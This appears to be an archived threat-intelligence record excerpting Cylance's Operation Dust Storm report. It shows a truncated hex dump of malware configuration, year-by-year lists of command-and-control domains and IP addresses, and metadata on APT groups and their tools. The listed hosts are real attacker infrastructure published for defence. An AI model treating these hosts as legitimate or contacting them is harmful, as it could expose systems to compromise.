---Truncated--- 00000780  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ 00000790  00 00 00 FF BB 01 00 00 4B 54 56 59 00 EE 12 00  ...ÿ»...KTVY.î.. 000007A0  5F F1 C1 54 C8 AF 00 00 D7 07 00 00 01 00 00 00  _ñÁTÈ¯..×....... 000007B0  00 00 00 00 20 8E 01 00 5B 00 52 00 45 00 44 00  .... Ž..[.R.E.D. 000007C0  41 00 43 00 54 00 45 00 44 00 5D 00 00 00 00 00  A.C.T.E.D.]..... ---Truncated\n\n**Figure 27: Example Decoded Configuration Data**\n\n\n10bfym.8800.org\n10kjd.amazonwikis.com\n1stone.zapto.org\n323332.3322.org\nadobekr.com\nadobeus.com\namazonwikis.com\naqyj.tomshardpc.com\nauto.glkjcorp.com\nb3fk.sfcorporation.com\nbdgs.amazonwikis.com\nbdt.wordoscorp.com\nbfym2.amazonwikis.com\nblog.adobeus.com\nblog.amazonwikis.com\nblog.sfcorporation.com\nblog.wih365.com\nbooks.sfcorporation.com\nbybf.amazonwikis.com\nbygs.sfcorporation.com\ncbgs.sfcorporation.com\ncdic.sfcorporation.com\ncxks.amazonwikis.com\nd2ch.sfcorporation.com\ndgfk.sfcorporation.com\ndghk.sfcorporation.com\ndown.adobeus.com\nekzy.gmnspace.com\nelecarrow.com\nen.amazonwikis.com\nexemail.net\nflash.adobeus.com\nfngs.adobeus.com\nfsw.adobeus.com\ngde.moviestops.com\nghlc.adobeus.com\nglkjcorp.com\ngmnspace.com\nguhk.moviestops.com\nhealth.dns1.us\nhglg.wordoscorp.com\nhjxt.sfcorporation.com\nhkabinc.com\nhkmj.amazonwikis.com\nhome.sfcorporation.com\nhsjs.wordoscorp.com\nhsy.moviestops.com\niccbhhjdgb.adobeus.com\nimage.amazonwikis.com\nimage.hkabinc.com\nimnothk.8800.org\njggs.sfcorporation.com\njiaoshow.9966.org\njnhs.tomshardpc.com\njrfw.amazonwikis.com\njrgs.sfcorporation.com\njs.95nb.co.cc\njs.adobekr.com\njs.amazonwikis.com\njs.exemail.net\nkb1gs.sfcorporation.com\nkersperskey.8800.org\n\n\n-----\n\nInfrastructure by Year (First DEFINITIVE Resolution Time)\n2010 C2 Infrastructure:\nIP Addresses: health.dns1.us\n218.106.246.195 mail.adobekr.com\n218.106.246.220 mail.glkjcorp.com\n218.106.246.254 nttvps.gnway.net\n111.67.199.213 qsgs.sfcorporation.com\n125.46.42.221 smtp.adobekr.com\n124.162.53.224 update.adobekr.com\n124.162.53.203 wsxg.moviestops.com\n113.11.202.233 wxpb.sfcorporation.com\n\n\nrjby.tomshardpc.com\nrjjh.wordoscorp.com\nssl.exemail.net\nssl.gmnspace.com\nssl.projectscorp.net\ntzz.exemail.net\nup.adobekr.com\nv.exemail.net\nwih365.com\nyqby.wordoscorp.com\nzpgx.tomshardpc.com\n\n\nDomains:\nbfym2.amazonwikis.com\nbooks.sfcorporation.com\nimnothk.8800.org\njiaoshow.9966.org\nkb1gs.sfcorporation.com\nkersperskey.8800.org\nmailxss.9966.org\nmicroses.9966.org\nmicroupdate.8800.org\nmicrowmies.oicp.net\nmocrosoftds.xicp.net\nmodeless.3322.org\nyhkj.sfcorporation.com\n\n2011 C2 Infrastructure:\nIP Addresses:\n218.106.247.81\n218.106.246.195\n218.106.246.177\n218.106.246.220\n125.46.42.221\n173.252.201.210\n120.126.134.196\n120.31.68.42\n\nDomains:\n*.moviestops.com\n323332.3322.org\nadobekr.com\njs.95nb.co.cc\njs.adobekr.com\nlogin.live.adobekr.com\nlogin.live.wih365.com\nmesdata.8866.org\nmocrosoftds.xicp.net\nmsejake.7766.org\nmsevpn.3322.org\nsdj2b.3322.org\n\n2012 C2 Infrastructure:\nIP Addresses:\n210.51.13.167\n126.25.172.171\n218.106.246.195\n123.254.111.169\n114.108.150.38\n175.41.23.181\n126.25.201.73\n126.5.125.197\n203.124.12.24\n218.106.246.222\n203.124.12.59\n\nDomains:\nauto.glkjcorp.com\ngde.moviestops.com\n\n\n2013 C2 Infrastructure:\nIP Addresses:\n218.106.246.189\n210.209.116.105\n210.209.117.235\n123.254.111.169\n113.10.168.22\n126.25.201.73\n126.125.35.247\n218.106.246.222\n112.218.71.202\n\nDomains:\nen.amazonwikis.com\nmail.projectscorp.net\nnews.sfcorporation.com\npic.elecarrow.com\nqsgs.sfcorporation.com\nrbjg.moviestops.com\nrbny.sfcorporation.com\nsmtp.adobekr.com\nssl.gmnspace.com\nssl.projectscorp.net\nupdate.adobekr.com\nyahoo.gmnspace.com\nyahoomail.adobeus.com\n\n2014 C2 Infrastructure:\nIP Addresses:\n23.238.229.128\n27.255.72.68\n27.255.72.69\n27.255.72.78\n211.42.249.37\n210.209.116.105\n210.209.117.235\n218.106.246.222\n108.171.240.154\n112.218.71.202\n112.175.69.60\n112.175.69.89\n114.108.150.38\n\nDomains:\nb3fk.sfcorporation.com\nbdt.wordoscorp.com\nbfym2.amazonwikis.com\nblog.sfcorporation.com\nbooks.sfcorporation.com\nbygs.sfcorporation.com\ncbgs.sfcorporation.com\ncdic.sfcorporation.com\nd2ch.sfcorporation.com\ndgfk.sfcorporation.com\ngde.moviestops.com\nguhk.moviestops.com\n\n\nhglg.wordoscorp.com\nhjxt.sfcorporation.com\nhome.sfcorporation.com\nhsy.moviestops.com\nimage.amazonwikis.com\njggs.sfcorporation.com\njrfw.amazonwikis.com\njrgs.sfcorporation.com\nkb1gs.sfcorporation.com\nmail.projectscorp.net\nmovie.sfcorporation.com\nmusic.sfcorporation.com\nnews.elecarrow.com\nnews.sfcorporation.com\npic.elecarrow.com\npic.glkjcorp.com\npics.adobeus.com\npics.amazonwikis.com\nqsgs.sfcorporation.com\nrbjg.moviestops.com\nrbny.sfcorporation.com\nruag.amazonwikis.com\nsgad.sfcorporation.com\nsmgs.amazonwikis.com\nsport.sfcorporation.com\nssl.projectscorp.net\nssl.sfcorporation.com\ntdfg.moviestops.com\ntqsj.sfcorporation.com\ntzcl.sfcorporation.com\nuworks.sfcorporation.com\nvideo.sfcorporation.com\nvod.sfcorporation.com\nwbjs.sfcorporation.com\nweb.sfcorporation.com\nwed.amazonwikis.com\nwsxg.moviestops.com\nwxpb.sfcorporation.com\nxjgs.sfcorporation.com\nxkgs.sfcorporation.com\nyahoo.gmnspace.com\nygfk.sfcorporation.com\nyhkj.sfcorporation.com\n\n2015 C2 Infrastructure:\nIP Addresses:\n113.10.139.218\n126.125.35.247\n27.255.72.68\n218.106.246.222\n210.209.116.105\n210.209.117.235\n118.193.163.143\n114.108.150.38\n210.209.117.148\n118.99.37.87\n\nDomains:\nekzy.gmnspace.com\nhsjs.wordoscorp.com\njnhs.tomshardpc.com\nmail.projectscorp.net\nnews.elecarrow.com\npic.glkjcorp.com\nrbjg.moviestops.com\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/dt9mscechq7heg83z7vgujp5ujjzd97c",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2016/2016.02.23.Operation_Dust_Storm/Op_Dust_Storm_Report.pdf"
    ],
    "report_names": [
        "Cylance_Op_Dust_Storm_Report(Feb-23-2016)",
        "Op_Dust_Storm_Report"
    ],
    "threat_actors": [
        {
            "id": "42a6a29d-6b98-4fd6-a742-a45a0306c7b0",
            "created_at": "2022-10-25T15:50:23.710403Z",
            "updated_at": "2025-03-27T02:00:55.531313Z",
            "deleted_at": null,
            "main_name": "Silence",
            "aliases": [
                "Whisper Spider"
            ],
            "source_name": "MITRE:Silence",
            "tools": [
                "Winexe",
                "SDelete"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "87a842ac-ca8b-41a6-9137-d2cd286e1f51",
            "created_at": "2022-10-25T16:07:23.559995Z",
            "updated_at": "2025-03-27T02:02:09.863336Z",
            "deleted_at": null,
            "main_name": "Dust Storm",
            "aliases": [],
            "source_name": "ETDA:Dust Storm",
            "tools": [
                "AngryRebel",
                "Chymine",
                "Darkmoon",
                "Farfli",
                "Gen:Trojan.Heur.PT",
                "Gh0st RAT",
                "Ghost RAT",
                "MiS-Type",
                "Misdat",
                "Moudour",
                "Mydoor",
                "PCRat",
                "Poison Ivy",
                "S-Type",
                "SPIVY",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "88e53203-891a-46f8-9ced-81d874a271c4",
            "created_at": "2022-10-25T16:07:24.191982Z",
            "updated_at": "2025-03-27T02:02:10.13692Z",
            "deleted_at": null,
            "main_name": "Silence",
            "aliases": [
                "ATK 86",
                "Contract Crew",
                "TAG-CR8",
                "TEMP.TruthTeller",
                "Whisper Spider"
            ],
            "source_name": "ETDA:Silence",
            "tools": [
                "EDA",
                "EmpireDNSAgent",
                "Farse",
                "Ivoke",
                "Kikothac",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Meterpreter",
                "ProxyBot",
                "ReconModule",
                "Silence.Downloader",
                "TiniMet",
                "TinyMet",
                "TrueBot",
                "xfs-disp.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "08472d2c-8fbc-4705-ad7a-eb618557cbd2",
            "created_at": "2023-01-06T13:46:38.23674Z",
            "updated_at": "2025-03-27T02:00:02.780032Z",
            "deleted_at": null,
            "main_name": "Dust Storm",
            "aliases": [
                "G0031"
            ],
            "source_name": "MISPGALAXY:Dust Storm",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a0f6bde9-34cb-46bf-88b7-b4e54c96beaa",
            "created_at": "2022-10-25T15:50:23.646492Z",
            "updated_at": "2025-03-27T02:00:55.512734Z",
            "deleted_at": null,
            "main_name": "Dust Storm",
            "aliases": [
                "Dust Storm"
            ],
            "source_name": "MITRE:Dust Storm",
            "tools": [
                "S-Type",
                "Mis-Type",
                "ZLib",
                "Misdat"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "dabb6779-f72e-40ca-90b7-1810ef08654d",
            "created_at": "2022-10-25T15:50:23.463113Z",
            "updated_at": "2025-03-27T02:00:55.47619Z",
            "deleted_at": null,
            "main_name": "APT1",
            "aliases": [
                "APT1",
                "Comment Crew",
                "Comment Group",
                "Comment Panda"
            ],
            "source_name": "MITRE:APT1",
            "tools": [
                "Seasalt",
                "ipconfig",
                "Cachedump",
                "PsExec",
                "GLOOXMAIL",
                "Lslsass",
                "PoisonIvy",
                "WEBC2",
                "Mimikatz",
                "gsecdump",
                "Pass-The-Hash Toolkit",
                "Tasklist",
                "xCmd",
                "pwdump"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "cf7fc640-acfe-41c4-9f3d-5515d53a3ffb",
            "created_at": "2023-01-06T13:46:38.228042Z",
            "updated_at": "2025-03-27T02:00:02.775905Z",
            "deleted_at": null,
            "main_name": "APT1",
            "aliases": [
                "GIF89a",
                "G0006",
                "PLA Unit 61398",
                "Group 3",
                "TG-8223",
                "Comment Group",
                "ShadyRAT",
                "COMMENT PANDA",
                "Comment Crew",
                "Byzantine Candor",
                "Brown Fox"
            ],
            "source_name": "MISPGALAXY:APT1",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9041c438-4bc0-4863-b89c-a32bba33903c",
            "created_at": "2023-01-06T13:46:38.232751Z",
            "updated_at": "2025-03-27T02:00:02.778714Z",
            "deleted_at": null,
            "main_name": "Nitro",
            "aliases": [
                "Covert Grove"
            ],
            "source_name": "MISPGALAXY:Nitro",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a2b44a04-a080-4465-973d-976ce53777de",
            "created_at": "2022-10-25T16:07:23.911791Z",
            "updated_at": "2025-03-27T02:02:10.025108Z",
            "deleted_at": null,
            "main_name": "Nitro",
            "aliases": [
                "Covert Grove",
                "Nitro"
            ],
            "source_name": "ETDA:Nitro",
            "tools": [
                "AngryRebel",
                "Backdoor.Apocalipto",
                "Chymine",
                "Darkmoon",
                "Farfli",
                "Gen:Trojan.Heur.PT",
                "Gh0st RAT",
                "Ghost RAT",
                "Moudour",
                "Mydoor",
                "PCClient",
                "PCRat",
                "Poison Ivy",
                "SPIVY",
                "Spindest",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "3aaf0755-5c9b-4612-9f0e-e266ef1bdb4b",
            "created_at": "2022-10-25T16:07:23.480196Z",
            "updated_at": "2025-03-27T02:02:09.826059Z",
            "deleted_at": null,
            "main_name": "Comment Crew",
            "aliases": [
                "APT 1",
                "BrownFox",
                "Byzantine Candor",
                "Byzantine Hades",
                "Comment Crew",
                "Comment Panda",
                "GIF89a",
                "Group 3",
                "Operation Oceansalt",
                "Operation Seasalt",
                "Operation Siesta",
                "Shanghai Group",
                "TG-8223"
            ],
            "source_name": "ETDA:Comment Crew",
            "tools": [
                "Auriga",
                "Cachedump",
                "Chymine",
                "CookieBag",
                "Darkmoon",
                "GDOCUPLOAD",
                "GLOOXMAIL",
                "GREENCAT",
                "Gen:Trojan.Heur.PT",
                "GetMail",
                "Hackfase",
                "Hacksfase",
                "Helauto",
                "Kurton",
                "LETSGO",
                "LIGHTBOLT",
                "LIGHTDART",
                "LOLBAS",
                "LOLBins",
                "LONGRUN",
                "Living off the Land",
                "Lslsass",
                "MAPIget",
                "ManItsMe",
                "Mimikatz",
                "MiniASP",
                "Oceansalt",
                "Pass-The-Hash Toolkit",
                "Poison Ivy",
                "ProcDump",
                "Riodrv",
                "SPIVY",
                "Seasalt",
                "ShadyRAT",
                "StarsyPound",
                "TROJAN.COOKIES",
                "TROJAN.FOXY",
                "TabMsgSQL",
                "Tarsip",
                "Trojan.GTALK",
                "WebC2",
                "WebC2-AdSpace",
                "WebC2-Ausov",
                "WebC2-Bolid",
                "WebC2-Cson",
                "WebC2-DIV",
                "WebC2-GreenCat",
                "WebC2-Head",
                "WebC2-Kt3",
                "WebC2-Qbp",
                "WebC2-Rave",
                "WebC2-Table",
                "WebC2-UGX",
                "WebC2-Yahoo",
                "Wordpress Bruteforcer",
                "bangat",
                "gsecdump",
                "pivy",
                "poisonivy",
                "pwdump",
                "zxdosml"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716503,
    "ts_updated_at": 1743041813,
    "ts_creation_date": 1456166376,
    "ts_modification_date": 1456166379,
    "files": {
        "pdf": "https://archive.orkl.eu/606f656561781dba6fdef666ece6a0cc24709f01.pdf",
        "text": "https://archive.orkl.eu/606f656561781dba6fdef666ece6a0cc24709f01.txt",
        "img": "https://archive.orkl.eu/606f656561781dba6fdef666ece6a0cc24709f01.jpg"
    }
}